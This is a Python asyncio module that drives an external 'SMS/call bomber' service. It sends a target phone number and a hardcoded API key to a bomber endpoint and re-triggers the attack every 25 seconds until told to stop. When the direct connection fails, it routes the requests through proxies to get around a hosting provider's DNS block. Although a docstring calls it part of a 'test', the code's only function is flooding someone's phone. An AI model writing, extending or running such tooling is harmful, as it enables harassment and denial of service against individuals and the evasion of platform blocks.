from __future__ import annotations

import asyncio
import aiohttp
from aiohttp import TCPConnector
from aiohttp_socks import ProxyConnector
from typing import Optional, List
import logging

logger = logging.getLogger(__name__)

EXTERNAL_BOMBER_KEY = "urfaaan_omdivine"
EXTERNAL_START_URL  = "https://bomber.kingcc.qzz.io/bomb"
EXTERNAL_STOP_URL   = "https://bomber.kingcc.qzz.io/stop"

# Re-ping interval in seconds
REPING_INTERVAL = 25


async def _fireUrl(url: str, phone: str, proxy: Optional[str] = None) -> bool:
    """Fire a URL with optional proxy. Returns True on success."""
    try:
        if proxy:
            connector = ProxyConnector.from_url(proxy, ssl=False)
        else:
            connector = TCPConnector(ssl=False)

        async with aiohttp.ClientSession(connector=connector) as session:
            async with session.get(
                url,
                params={"key": EXTERNAL_BOMBER_KEY, "numbar": phone},
                timeout=aiohttp.ClientTimeout(total=12),
                allow_redirects=True,
            ) as resp:
                text = await resp.text()
                logger.info(f"External bomber {url.split('/')[-1]} → {resp.status} | {text[:80]}")
                return resp.status < 500
    except Exception as e:
        logger.info(f"External bomber failed ({type(e).__name__}: {str(e)[:60]})")
        return False


async def _tryWithProxies(url: str, phone: str, proxies: List[str]) -> bool:
    """Try direct first, then each proxy until one works."""
    # Try direct
    if await _fireUrl(url, phone, proxy=None):
        return True
    # Try each proxy
    for proxy in proxies[:5]:  # max 5 proxies to try
        if await _fireUrl(url, phone, proxy=proxy):
            return True
    return False


async def startExternalBomber(phone: str, proxies: List[str] = []) -> bool:
    return await _tryWithProxies(EXTERNAL_START_URL, phone, proxies)


async def stopExternalBomber(phone: str, proxies: List[str] = []) -> None:
    await _tryWithProxies(EXTERNAL_STOP_URL, phone, proxies)


async def externalBomberLoop(phone: str, stopEvent: asyncio.Event, proxies: List[str] = []) -> None:
    """
    Runs alongside the main test.
    Fires start, re-pings every REPING_INTERVAL seconds, fires stop at end.
    Routes through proxies if direct connection fails (bypasses Railway DNS block).
    """
    ok = await startExternalBomber(phone, proxies)
    if not ok:
        logger.info("External bomber unavailable from all routes — skipping")
        return

    while not stopEvent.is_set():
        try:
            await asyncio.wait_for(
                asyncio.shield(stopEvent.wait()),
                timeout=REPING_INTERVAL
            )
            break
        except asyncio.TimeoutError:
            await startExternalBomber(phone, proxies)

    await stopExternalBomber(phone, proxies)